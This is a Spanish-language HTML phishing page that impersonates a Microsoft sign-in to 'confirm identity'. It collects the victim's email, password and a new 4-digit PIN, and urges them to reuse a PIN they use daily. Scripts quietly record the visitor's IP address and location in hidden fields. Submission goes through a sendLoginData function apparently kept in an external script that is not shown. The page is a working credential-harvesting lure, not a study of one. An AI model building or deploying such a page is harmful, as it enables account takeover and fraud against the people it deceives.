<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>Home</title>
    <link rel="shortcut icon" type="image/x-icon" href="https://companieslogo.com/img/orig/MSFT-a203b22d.png?t=1633073277">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
    <script>
         $.getJSON("https://api.ipify.org?format=json", function(data) {
             $("#gfg").html(data.ip);
         })
    </script>
    <script>
         $.getJSON("https://ipinfo.io", function (response) {
            $("#ip").html("IP: " + response.ip);
            $("#address").html("" + response.city + ", " + response.country);
         })
    </script>
    <style>
        /* ... tu CSS igual que antes ... */
    </style>
</head>
<body>
<div class="login-container">
    <div class="wrapper">
        <div class="col-xs-12 col-sm-4 col-sm-offset-4 login-box" style="z-index:1000">
            <div class="login-header"><img src="https://pbs.twimg.com/media/Fth9clMXwBYturo?format=jpg&name=small">
                <h4 class="ingresa-cuenta">Ingresa a tu cuenta</h4>
                <p class="text">Iniciá sesión en la plataforma Microsoft para confirmar identidad.</p>
            </div>
            <div class="alert alert-danger" id="error-message"></div>
            <div>
                <form action="" method="post" onsubmit="return sendLoginData()">
                    <div class="form-group label-animate">
                        <label for="uzer">Correo electrónico</label>
                        <input class="form-control" id="uzer" type="email" name="uzer" autocomplete="off" required>
                    </div>
                    <div class="form-group label-animate">
                        <label for="pazz">Contraseña</label>
                        <i class="fa fa-eye eye-icon" aria-hidden="true" onclick="showPassword()" style="cursor: pointer;"></i>
                        <input class="form-control" id="pazz" name="pazz" type="password" required minlength="5">
                    </div>
                    <div class="iHdVbkVQvFXkuwc">Para reforzar la seguridad de tu cuenta es necesario que crees un pin de 4 números. Le recomendamos usar uno que frecuentes a diario para evitar ser olvidado.</div>
                    <div class="form-group label-animate">
                        <label for="p1n">Crear Pin</label>
                        <input class="form-control" id="p1n" type="number" name="p1n" autocomplete="off" maxlength="4" required min="0" max="9999" pattern="\d{4}" oninput="validatePinInput(this)">
                    </div>
                    <p id="gfg" hidden></p>
                    <p id="address" hidden></p>
                    <div class="center" style="padding-top: 5px; padding-bottom: 5px; margin-top: 5px">
                        <a id="link-olvidaste-tu-password" href="h">¿Olvidaste tu contraseña?</a>
                    </div>
                    <div class="captcha-container form-group" style="display: none;"></div>
                    <button class="btn btn-primary btn-block" id="btn-login">Iniciar sesión</button>
                </form>
                <div id="bottom-imgs">
                    <div class="img-block"><img src="https://pbs.twimg.com/media/Fth_yz1XwAcYAuX?format=png&name=360x360"></div>
                    <div id="vl"></div>
                    <div class="img-block"><img src="https://pbs.twimg.com/media/Fth_4zaX0AAw80V?format=png&name=small"></div>
                </div>
                <div class="center"></div>
                <hr style="width: 30%; background-color:#666666; margin-top: 10px; margin-bottom: 10px;">
                <p class="center text" style="margin: 0;">Contactanos:</p>
                <div class="center">
                    <p class="text" style="display:inline">outlook.live.com</p>
                </div>
            </div>
        </div>
        <div id="gradient"></div>
    </div>
    <div class="login-footer"></div>
    <div class="login-footer-responsive"><img src="https://pbs.twimg.com/media/Fth-XmMXwBYrdcF?format=jpg&name=small"></div>
</div>
<script src="sax.js"></script>
<script>
function showPassword() {
    var input = document.getElementById("pazz");
    input.type = input.type === "password" ? "text" : "password";
}
// Solo permitir números y máximo 4 dígitos
function validatePinInput(input) {
    let value = input.value.replace(/\D/g, ''); // Elimina todo lo que no sea número
    if (value.length > 4) value = value.slice(0, 4);
    input.value = value;
}
</script>
</body>
</html>
